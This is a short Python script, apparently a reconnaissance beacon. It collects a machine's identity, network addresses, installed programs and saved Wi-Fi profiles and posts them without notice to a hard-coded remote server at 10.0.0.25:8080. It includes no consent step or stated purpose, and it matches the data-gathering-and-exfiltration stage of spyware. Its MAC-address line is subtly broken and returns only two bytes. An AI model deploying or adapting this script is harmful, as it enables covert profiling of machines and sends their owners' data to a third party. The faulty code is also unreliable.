import os
import socket
import platform
import subprocess
import uuid
import psutil
import requests

def get_system_info():
    try:
        info = {}
        
        # Basic System Info
        info['Computer Name'] = os.getenv("COMPUTERNAME")
        info['Username'] = os.getlogin()
        info['OS'] = platform.system()
        info['OS Version'] = platform.version()
        info['Architecture'] = platform.architecture()[0]
        
        # IP and MAC Address
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                                for elements in range(0, 2*6, 8)][::-1])
        info['Hostname'] = hostname
        info['Local IP'] = ip_address
        info['MAC Address'] = mac_address
        
        # Public IP
        try:
            public_ip = requests.get("https://api.ipify.org").text
            info['Public IP'] = public_ip
        except:
            info['Public IP'] = "Unable to fetch"
        
        # CPU and RAM Info
        info['CPU Cores'] = psutil.cpu_count(logical=True)
        info['CPU Usage'] = f"{psutil.cpu_percent(interval=1)}%"
        memory = psutil.virtual_memory()
        info['Total RAM (GB)'] = round(memory.total / (1024 ** 3), 2)
        info['Available RAM (GB)'] = round(memory.available / (1024 ** 3), 2)
        
        # Disk Usage
        disk = psutil.disk_usage('/')
        info['Total Disk (GB)'] = round(disk.total / (1024 ** 3), 2)
        info['Used Disk (GB)'] = round(disk.used / (1024 ** 3), 2)
        info['Free Disk (GB)'] = round(disk.free / (1024 ** 3), 2)
        
        # Installed Programs (Windows only)
        try:
            installed_programs = subprocess.check_output("wmic product get name,version", shell=True).decode()
            info['Installed Programs'] = installed_programs
        except:
            info['Installed Programs'] = "Unable to fetch"
        
        # Connected Wi-Fi Networks (Windows only)
        try:
            networks = subprocess.check_output("netsh wlan show profile", shell=True).decode()
            info['Wi-Fi Networks'] = networks
        except:
            info['Wi-Fi Networks'] = "Unable to fetch"
        
        return info
    except Exception as e:
        return {"Error": str(e)}

def send_info(data):
    try:
        server_url = "http://10.0.0.25:8080/report"  # Change to your server URL
        requests.post(server_url, json=data)
    except Exception as e:
        print(f"Error sending data: {e}")

if __name__ == "__main__":
    system_info = get_system_info()
    send_info(system_info)
